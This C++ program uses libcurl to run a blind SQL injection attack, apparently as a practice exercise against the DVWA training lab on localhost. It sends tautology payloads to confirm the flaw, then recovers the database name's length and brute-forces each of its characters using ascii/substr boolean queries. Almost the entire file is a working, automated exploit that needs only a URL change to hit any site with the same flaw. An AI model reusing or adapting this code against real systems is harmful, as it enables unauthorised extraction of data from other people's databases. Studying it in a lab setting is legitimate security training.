#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
// Callback function to store response data
size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata)
{
    size_t len = size * nmemb;
    userdata->append(ptr, len);
    return len;
}

std::vector<int> compute_prefix(const std::string& pattern)
{
    int n = pattern.size();
    std::vector<int> prefix(n);
    prefix[0] = 0;

    int j = 0;
    for (int i = 1; i < n; i++)
    {
        while (j > 0 && pattern[j] != pattern[i])
        {
            j = prefix[j-1];
        }
        if (pattern[j] == pattern[i])
        {
            j++;
        }
        prefix[i] = j;
    }

    return prefix;
}

// Search for the pattern within the text using the KMP algorithm
size_t Find(const std::string& text, const std::string& pattern)
{
    int n = text.size();
    int m = pattern.size();

    // Compute the prefix function for the pattern
    std::vector<int> prefix = compute_prefix(pattern);

    int j = 0;
    for (int i = 0; i < n; i++)
    {
        while (j > 0 && pattern[j] != text[i])
        {
            j = prefix[j-1];
        }
        if (pattern[j] == text[i])
        {
            j++;
        }
        if (j == m)
        {
            // Found a match at position i-m+1
            return i-m+1;
        }
    }

    // Pattern not found
    return std::string::npos;
}


int find_dbname_length()
{
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return 1;
    }
    int length;
    std::string response;
    std::string successmessage="exists";
    std::string payload="1'AND+length(database())+=";
    std::string fixedpayload="%23&Submit=Submit";
    for(int i=1; i<=100; i++)
    {
        std::string s=std::to_string(i);
        std::string url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payload+s+fixedpayload;
        std::cout << url <<"\n";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
        curl_easy_setopt(curl, CURLOPT_HEADER, 1);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
            curl_easy_cleanup(curl);
            return 1;
        }

        if (response.empty())
        {
            std::cerr << "Empty response data\n";
        }
        // std::cout << response <<"\n";
        if(Find(response,successmessage)!=std::string::npos)
        {
            length=i;
            break;
        }
    }
    return length;

}

std::string find_dbname(int length)
{
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return "";
    }
    std::string name="";
    std::string successmessage="exists";
    std::string payloadpart1="1'+AND+(ascii(substr((select+database()),";
    std::string payloadpart2=",1)))+=+";
    std::string fixedpayload="%23&Submit=Submit";
    for(int i=1; i<=length; i++)
    {

        std::string s1=std::to_string(i);
        for(int j=0; j<128; j++)
        {
            std::string response;
            std::string s=std::to_string(j);
            std::string url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payloadpart1+s1+payloadpart2+s+fixedpayload;
            //std::cout << url <<"\n";
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
            curl_easy_setopt(curl, CURLOPT_HEADER, 1);
            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK)
            {
                std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
                curl_easy_cleanup(curl);
                return "";
            }

            if (response.empty())
            {
                std::cerr << "Empty response data\n";
            }
            // std::cout << response <<"\n";
            if(Find(response,successmessage)!=std::string::npos)
            {
                std::cout << i<<" character of dbname is : "<<(char)j<<"\n";
                name.push_back((char)j);
                break;
            }
        }
    }
    return name;

}


int main()
{
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return 1;
    }
    std::string payload="1'+AND+4570=4570+AND+'ZeoB'='ZeoB";
    std::string fixedpayload="&Submit=Submit";
    std::string successmessage="exists";
    std::string errormessage="MISSING";
    bool vulnerable=false;

    std::string response;

    std::string url = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=" +payload+fixedpayload;
    std::cout << url <<"\n";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
    curl_easy_setopt(curl, CURLOPT_HEADER, 1);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
        curl_easy_cleanup(curl);
        return 1;
    }

    if (response.empty())
    {
        std::cerr << "Empty response data\n";
    }

    //std::cout << "Response: " << response << "\n";
    if(Find(response,successmessage)!=std::string::npos)
    {
        vulnerable=true;
    }



    curl_easy_cleanup(curl);
    if(vulnerable)
    {
        std::cout << "The website is vulnerable to Blind SQL injection\n";
    }
    else std::cout << "The website is not vulnerable.Sorry we can not do any further work\n";

    if(vulnerable)
    {
        int len=find_dbname_length();
        std::cout << "Length of the database name is "<< len << "\n";

        std::string name=find_dbname(len);
        std::cout << "Database name is "<< name<< "\n";
    }
    return 0;
}

